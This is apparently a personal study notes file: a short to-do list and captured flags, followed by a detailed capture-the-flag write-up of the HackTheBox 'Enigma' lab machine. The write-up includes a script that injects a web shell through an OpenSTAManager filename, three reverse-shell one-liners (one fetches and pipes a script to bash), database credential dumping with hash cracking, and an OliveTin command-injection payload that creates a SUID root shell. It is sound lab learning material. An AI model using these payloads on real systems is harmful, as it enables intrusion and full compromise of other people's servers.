- [ ] CLEAN UP TAGS
- [ ] Re-read all the files in the **Network Fundamentals** folder carefully — don’t skim this time as you move everything into [[NETWORKING FUNDAMENTALS]]
- [ ] Re-read all the files in the **Windows** folder carefully — don’t skim this time! 
- [ ] Create tags for TOOLS and LABS and delete the index notes respectively.
- [ ] Go through all older notes and replace **`#TOOLS`** tags with **`#[ToolName]`** tags (e.g., `#nmap`, `#wireshark`, etc.) to match your current tagging system. And add the changes to the [[00 TOOLS]] note.

- [ ] move files from the Metasploit folder to [[METASPLOIT FRAMEWORK]]
- [ ] Redo VULNERABILITY ASSESSSMENT
- [ ] Redo NETWORKING FUNDAMENTALS
- [ ] Redo WINDOWS




USER FLAG: 84a80aa8e137117ca27594646c501609
ROOT FLAG: df1ced3383b2e0fbdae7d650747044d7


**





# HackTheBox: Enigma Writeup (Detailed Guide)

**Difficulty:** Easy | **OS:** Linux

This guide provides a comprehensive, step-by-step walkthrough of the Enigma machine, including all scripts, alternative payloads, and intricate details required to complete the box from start to finish.

## Attack Chain Summary

1. **NFS Enumeration:** Mounted a world-readable NFS share (/srv/nfs/onboarding) to find a PDF containing initial employee webmail credentials (kevin).
2. **Mailbox Access:** Used POP3/IMAPS with Kevin's credentials. Discovered password reuse for the user sarah. Accessed Sarah's mailbox to extract administrative credentials for an internal OpenSTAManager instance.
3. **Exploitation (Foothold):** Exploited OS Command Injection (CVE-2025-69212 / CVE-2026-38751) via .p7m file uploads in OpenSTAManager to achieve a reverse shell as www-data.
4. **Lateral Movement:** Read the OpenSTAManager configuration file to extract MySQL database credentials. Dumped the zz_users table, extracted a bcrypt hash for haris, cracked it, and used su to switch users.
5. **Privilege Escalation:** Discovered a locally running OliveTin instance. Exploited an unauthenticated command injection vulnerability in a YAML-defined action (db_pass parameter) via the OliveTin API to spawn a SUID root bash binary.

## 1. Reconnaissance

We start with a comprehensive Nmap scan against the target IP to identify open ports and running services.

```
nmap -sC -sV -p- <TARGET_IP>
```

**Results:**

```
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  3 (RPC #100227)
```

_Note: Add the base domain enigma.htb to your /etc/hosts file._

## NFS Enumeration

Port 2049 (NFS) and 111 (RPC) are open. We can check for available network mounts using showmount or nxc (NetExec). Let's mount the available onboarding directory to our local machine.

```
# Create a local mount point
mkdir -p /tmp/nfs_mount

# Mount the remote share
sudo mount -t nfs <TARGET_IP>:/srv/nfs/onboarding /tmp/nfs_mount -o nolock

# Inspect the contents
ls -la /tmp/nfs_mount/
```

---

Inside, we find a world-readable file named New_Employee_Access.pdf. We can read its contents directly in the terminal using pdftotext:

```
pdftotext /tmp/nfs_mount/New_Employee_Access.pdf -
```

**Extracted PDF Content:**

```
Enigma Corp
IT Department - New Employee System Access
Employee: Kevin Mitchell
Department: Operations
Provisioned by: IT Department
Date: 2024-03-01

Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

_Action: Add mail001.enigma.htb to /etc/hosts._

## 2. Mailbox Enumeration & Credential Gathering

We have credentials for kevin (Enigma2024!). The Nmap scan showed POP3 (110, 995) and IMAP (143, 993) are open.

Through standard credential testing, we discover a **password reuse vulnerability**: the password Enigma2024! also works for the user sarah.

We can interact directly with the POP3 SSL service using openssl to read Sarah's emails:

```
openssl s_client -connect enigma.htb:995 -quiet << 'EOF'
USER sarah
PASS Enigma2024!
LIST
RETR 1
QUIT
EOF
```

**Email Contents (RETR 1):**

```
Hi Sarah,
Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

_Action: Add support_001.enigma.htb to /etc/hosts._

---

_(Image 3: Screenshot of OpenSTAManager dashboard at http://support_001.enigma.htb/controller.php?id_module=1, logged in as admin, showing the calendar view for Jun 21–27, 2026.)_

_(Image 4: Screenshot of OpenSTAManager Sales Invoices > Importazione FE page at localhost:8081, showing a file upload field with "FINAL_WEBSHELL.zip" selected and a "Carica documenti" button highlighted.)_

---

## 3. Web Exploitation (Foothold)

Navigating to http://support_001.enigma.htb reveals an instance of **OpenSTAManager**.

Researching this application reveals a critical OS Command Injection vulnerability in the P7M (signed XML) file decoding functionality (tracked as CVE-2025-69212 / GHSA-25fp-8w8p-mx36, and associated with CVE-2026-38751).

- **Vulnerability Context:** The app allows uploading ZIP files containing .p7m files for invoice processing. The filename of the .p7m file is not properly sanitized before being passed to a system command, leading to RCE.
- **Public PoC Reference:** https://raw.githubusercontent.com/XiaomingX/data-cve-poc-py-v1/387f205cf558fb83953419e852e2d845da2adb13/2026/CVE-2026-38751/poc.py

### Step 3.1: Creating the Malicious Payload

We use a Python script to generate a ZIP file (exploit.zip). The ZIP contains a dummy file, but its _filename_ contains our injected shell command. This command will write a PHP web shell (SHELL.php) into the accessible files directory.

Create exploit_gen.py:

```python
import zipfile

# The command writes a simple PHP passthru shell
cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'

# Injecting the command into the filename
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")

print("[+] exploit.zip created")
```

Run it: `python3 exploit_gen.py`

### Step 3.2: Uploading the Payload via cURL

We can automate the login and upload process using curl. We log in as admin (using the credentials found in Sarah's email) and save the session cookie, then upload the ZIP to the "Sales Invoices -> Importazione FE" module.

```bash
# 1. Login and save cookies
curl -c cookies.txt -b cookies.txt -X POST \
  -d "username=admin&password=Ne3s4rtars78s" \
  http://support_001.enigma.htb/?op=login

# 2. Upload the exploit.zip
curl -X POST -b cookies.txt \
  -F "blob1=@exploit.zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48" \
  "http://support_001.enigma.htb/actions.php"
```

### Step 3.3: Getting a Reverse Shell

First, verify the shell was created successfully:

```
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# Output should be: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now, establish a reverse shell. Depending on the target environment, URL encoding issues can cause payloads to fail. Here are three highly reliable methods discussed during the exploitation phase. Start your netcat listener first: `nc -lvnp 4444`.

**Method A: Base64 Encoded Payload (Most Reliable)**

```bash
# Generate the base64 payload locally:
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' | base64 -w0
# Example Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvNDQ0NCAwPiYx

# Execute via cURL:
curl --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjMvNDQ0NCAwPiYx|base64 -d|bash" \
"http://support_001.enigma.htb/files/SHELL.php"
```

**Method B: URL Encoded Bash**

```
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261'"
```

**Method C: Hosting a shell script locally**

```bash
# On your machine, create shell.sh with your reverse shell payload
# Start a python web server: python3 -m http.server 8000
curl \
"http://support_001.enigma.htb/files/SHELL.php?c=curl%20http%3A%2F%2F<YOUR_IP>%3A8000%2Fshell.sh%7Cbash"
```

You should now have an interactive shell as www-data.

## 4. Lateral Movement to haris

As www-data, we enumerate the OpenSTAManager web directory (/var/www/html/openstamanager or similar). Reading the configuration file reveals MySQL database credentials.

```
cat config.inc.php
# Found: DB User: brollin | DB Pass: Fri3nds@9099
```

We log into the MySQL database to dump user credentials from the zz_users table:

```
mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null
```

We retrieve the following bcrypt hash for the user haris:

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

Save this hash to a file named hash.txt on your attacking machine and crack it using hashcat and the rockyou wordlist:

```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

---

**Cracked Password:** bestfriends

Back in our www-data reverse shell, we simply switch to the haris user:

```
su haris
# Enter password: bestfriends
```

You are now haris. Grab the user.txt flag!

## 5. Privilege Escalation to root

Running a local network scan or checking running processes reveals a service called **OliveTin** running on local port 1337. OliveTin is a web interface for safely executing predefined shell commands.

### Investigating OliveTin

We can find the API endpoints and binary information by checking strings on the binary:

```
strings /usr/local/bin/OliveTin | grep -i "action_id\|binding"
```

Official documentation (https://docs.olivetin.app/api/method_StartActionByGetAndWait.html) confirms the existence of API endpoints like StartActionAndWait.

Checking the OliveTin configuration file at /etc/OliveTin/config.yaml:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

The application is configured with authRequireGuestsToLogin: false and exec: true, meaning unauthenticated guests can execute this predefined action.

### The Vulnerability (Command Injection)

Look closely at how the db_pass variable is interpolated: `-p'{{ db_pass }}'`.

Because it is placed directly inside single quotes without sanitization, we can break out of the string using a single quote ('), append a semicolon (;) to end the mysqldump command, inject our own malicious command, and comment out the rest of the line with a hash (#).

**Payload Structure:** `x' ; <COMMAND> ; #`

### Exploitation Scripts

We will use curl to send a JSON POST request to the OliveTin local API, triggering the action and injecting our payload.

**Method 1: SUID Bash (Interactive Root Shell)**

This payload copies /bin/bash to /tmp and sets the SUID bit, allowing us to drop into a root shell.

```bash
curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait" \
  -H "Content-Type: application/json" \
  -d '{
    "actionId": "backup_database",
    "arguments": [
      {"name": "db_user", "value": "backup_svc"},
      {"name": "db_pass", "value": "x\' ; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash ; #"},
      {"name": "db_name", "value": "production"}
    ]
  }'
```

Once the command finishes, execute the SUID binary:

```
/tmp/rootbash -p
id
# uid=0(root) gid=1000(haris) euid=0(root)
```

**Method 2: Direct Flag Read**

If you just want to grab the flag quickly without an interactive shell, you can inject a cat command:

```bash
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"actionId": "backup_database", "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x\' ; cat /root/root.txt > /tmp/flag.txt ; #"},
    {"name": "db_name", "value": "production"}
  ]}' \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait

cat /tmp/flag.txt
```

**System fully compromised!**